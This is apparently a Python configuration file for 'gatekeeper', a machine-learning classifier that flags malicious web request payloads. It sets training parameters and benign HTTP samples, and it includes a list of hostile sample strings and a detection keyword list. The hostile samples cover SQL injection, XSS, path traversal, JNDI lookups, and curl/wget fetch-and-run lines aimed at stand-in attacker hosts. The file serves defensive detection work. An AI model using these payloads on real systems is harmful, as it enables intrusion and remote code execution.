"""Global configuration for the gatekeeper ML project."""

from __future__ import annotations

from dataclasses import dataclass
from pathlib import Path


@dataclass(frozen=True)
class PayloadSource:
    """Represents candidate payload-list directories in PayloadsAllTheThings.

    Attributes:
        name: Human-readable category name.
        payload_directories: Repository-relative payload directories to inspect.
    """

    name: str
    payload_directories: tuple[str, ...]


PACKAGE_DIR = Path(__file__).resolve().parent
BASE_DIR = PACKAGE_DIR.parent.parent
DATA_DIR = BASE_DIR / "data"
RAW_DATA_DIR = DATA_DIR / "raw"
PROCESSED_DATA_DIR = DATA_DIR / "processed"
MODELS_DIR = BASE_DIR / "models"
PACKAGE_MODELS_DIR = PACKAGE_DIR / "models"

MODEL_FILENAME = "gatekeeper_payload_classifier.pkl"
MODEL_PATH = MODELS_DIR / MODEL_FILENAME
PACKAGED_MODEL_FILENAME = "payload_classifier.pkl"
PACKAGED_MODEL_PATH = PACKAGE_MODELS_DIR / PACKAGED_MODEL_FILENAME
PROCESSED_DATASET_FILENAME = "payload_training_dataset.parquet"
PROCESSED_DATASET_PATH = PROCESSED_DATA_DIR / PROCESSED_DATASET_FILENAME
PROCESSED_DATASET_FALLBACK_CSV = PROCESSED_DATA_DIR / "payload_training_dataset.csv"
SUSPICIOUS_RAW_CACHE = RAW_DATA_DIR / "suspicious_payloads.txt"
NORMAL_RAW_CACHE = RAW_DATA_DIR / "normal_samples.txt"
METRICS_PATH = MODELS_DIR / "training_metrics.json"

PAYLOADS_REPO = "swisskyrepo/PayloadsAllTheThings"
PAYLOADS_BRANCH = "master"
GITHUB_API_BASE_URL = "https://api.github.com"
GITHUB_CONTENTS_API_TEMPLATE = (
    GITHUB_API_BASE_URL + "/repos/{repo}/contents/{path}?ref={branch}"
)
RAW_BASE_URL = (
    "https://raw.githubusercontent.com/"
    f"{PAYLOADS_REPO}/{PAYLOADS_BRANCH}"
)

PAYLOAD_SOURCES: tuple[PayloadSource, ...] = (
    PayloadSource(
        name="sql_injection",
        payload_directories=(
            "SQL Injection/Intruder",
            "SQL Injection/Intruders",
        ),
    ),
    PayloadSource(
        name="xss",
        payload_directories=(
            "XSS Injection/Intruder",
            "XSS Injection/Intruders",
        ),
    ),
    PayloadSource(
        name="directory_traversal",
        payload_directories=(
            "Directory Traversal/Intruder",
            "Directory Traversal/Intruders",
        ),
    ),
    PayloadSource(
        name="command_injection",
        payload_directories=(
            "Command Injection/Intruder",
            "Command Injection/Intruders",
        ),
    ),
    PayloadSource(
        name="file_inclusion",
        payload_directories=(
            "File Inclusion/Intruder",
            "File Inclusion/Intruders",
        ),
    ),
)

ALLOWED_INTRUDER_FILE_EXTENSIONS = {".txt", ""}
EXCLUDED_INTRUDER_FILENAMES = {"readme.md"}
EXCLUDED_INTRUDER_EXTENSIONS = {".md", ".py", ".rb", ".sh", ".json"}
MAX_FILES_PER_SOURCE = 25
REQUEST_TIMEOUT_SECONDS = 20
HTTP_USER_AGENT = "gatekeeper-ml/1.0 (+https://github.com/swisskyrepo/PayloadsAllTheThings)"

PAYLOAD_MIN_LENGTH = 2
PAYLOAD_MAX_LENGTH = 512
PAYLOAD_MIN_SPECIAL_CHAR_RATIO = 0.10

RANDOM_STATE = 42
TEST_SIZE = 0.20

TFIDF_NGRAM_RANGE = (2, 4)
TFIDF_MAX_FEATURES = 40000
TFIDF_MIN_DF = 2
TFIDF_SUBLINEAR_TF = True

RF_N_ESTIMATORS = 220
RF_MAX_DEPTH = 28
RF_MIN_SAMPLES_SPLIT = 2
RF_MIN_SAMPLES_LEAF = 1
RF_CLASS_WEIGHT = {0: 1.0, 1: 2.0}

INFERENCE_SUSPICIOUS_THRESHOLD = 0.35

SAFE_HTTP_HEADER_NAMES = {
    "accept",
    "accept-encoding",
    "accept-language",
    "authorization",
    "cache-control",
    "connection",
    "content-length",
    "content-type",
    "cookie",
    "host",
    "origin",
    "pragma",
    "referer",
    "sec-fetch-dest",
    "sec-fetch-mode",
    "sec-fetch-site",
    "user-agent",
    "x-forwarded-for",
    "x-real-ip",
}

STANDARD_HTTP_HEADERS = (
    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Encoding: gzip, deflate, br",
    "Accept-Language: en-US,en;q=0.9",
    "Cache-Control: no-cache",
    "Connection: keep-alive",
    "Content-Type: application/json",
    "Host: api.example.com",
    "Pragma: no-cache",
    "Sec-Fetch-Dest: empty",
    "Sec-Fetch-Mode: cors",
    "Sec-Fetch-Site: same-origin",
)

COMMON_USER_AGENTS = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/123.0.6312.86 Safari/537.36",
    "curl/8.7.1",
    "python-requests/2.32.3",
    "PostmanRuntime/7.39.0",
)

SAFE_MIME_TYPES = (
    "*/*",
    "application/json",
    "application/json; charset=utf-8",
    "application/xml",
    "application/xml; charset=utf-8",
    "application/xhtml+xml",
    "font/woff2",
    "image/apng",
    "image/avif",
    "image/jpeg",
    "image/png",
    "image/svg+xml",
    "image/webp",
    "multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW",
    "text/css",
    "text/csv; charset=utf-8",
    "text/html",
    "text/html; charset=utf-8",
    "text/javascript",
    "text/plain",
    "text/plain; charset=utf-8",
)

SAFE_ACCEPT_VALUES = (
    "*/*",
    "application/json",
    "application/json, text/plain, */*",
    "application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "image/avif,image/webp,image/apng,*/*;q=0.8",
    "text/css,*/*;q=0.1",
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "text/plain, application/json;q=0.9, */*;q=0.8",
)

SAFE_ACCEPT_ENCODING_VALUES = (
    "gzip",
    "gzip, deflate",
    "gzip, deflate, br",
    "br, gzip, deflate",
    "gzip, deflate, br, zstd",
    "identity",
)

SAFE_ACCEPT_LANGUAGE_VALUES = (
    "en-US,en;q=0.9",
    "vi-VN,vi;q=0.8,en-US;q=0.6",
    "fr-FR,fr;q=0.9,en;q=0.5",
    "de-DE,de;q=0.9,en;q=0.7",
    "ja-JP,ja;q=0.9,en-US;q=0.5",
)

SAFE_CACHE_CONTROL_VALUES = (
    "max-age=0",
    "max-age=0, must-revalidate",
    "no-cache",
    "no-cache, no-store, must-revalidate",
    "private, max-age=3600",
    "public, max-age=86400",
)

SAFE_COOKIE_NAMES = (
    "sessionid",
    "csrftoken",
    "visitor_id",
    "theme",
    "locale",
    "tracking_id",
)

SAFE_URI_PREFIXES = (
    "/",
    "/index.html",
    "/healthz",
    "/metrics",
    "/api/v1/users",
    "/api/v1/orders",
    "/assets/logo.svg",
    "/static/js/app.js",
    "/static/css/main.css",
    "/docs/getting-started",
)

SAFE_PARAM_VALUES = (
    "true",
    "false",
    "en-US",
    "vi-VN",
    "light",
    "dark",
    "ascending",
    "descending",
    "json",
    "html",
    "mobile",
    "desktop",
    "active",
    "pending",
    "profile",
)

SAFE_FILE_PATHS = (
    "/var/www/html/index.html",
    "/srv/app/static/logo.png",
    "/home/app/config/settings.yaml",
    "/usr/share/nginx/html/healthcheck.txt",
    "C:/inetpub/wwwroot/index.html",
    "C:/ProgramData/App/config.json",
)

BOOTSTRAP_SUSPICIOUS_PAYLOADS = (
    "' OR 1=1 --",
    "\" OR \"1\"=\"1",
    "admin'--",
    "' UNION SELECT NULL,NULL --",
    "<script>alert(1)</script>",
    "\"><img src=x onerror=alert(1)>",
    "../../../../etc/passwd",
    "..%2f..%2f..%2fetc%2fpasswd",
    "; cat /etc/passwd",
    "&& whoami",
    "| id",
    "$(curl http://evil.example/s.sh|sh)",
    "${jndi:ldap://attacker/a}",
    "<svg/onload=confirm(1)>",
    "'; WAITFOR DELAY '0:0:5'--",
    "${{7*7}}",
    "<%= 7 * 7 %>",
    "../../boot.ini",
    "file=../../../../windows/win.ini",
    "cmd=;wget http://attacker/payload.sh",
)

SUSPICIOUS_KEYWORDS = (
    "alert(",
    "base64",
    "benchmark(",
    "cat /etc/passwd",
    "cmd=",
    "document.cookie",
    "drop table",
    "exec(",
    "information_schema",
    "jndi:",
    "load_file(",
    "onerror=",
    "onload=",
    "or 1=1",
    "../",
    "%2f",
    "%3cscript",
    "select ",
    "sleep(",
    "union ",
    "wget ",
    "whoami",
    "xp_cmdshell",
)
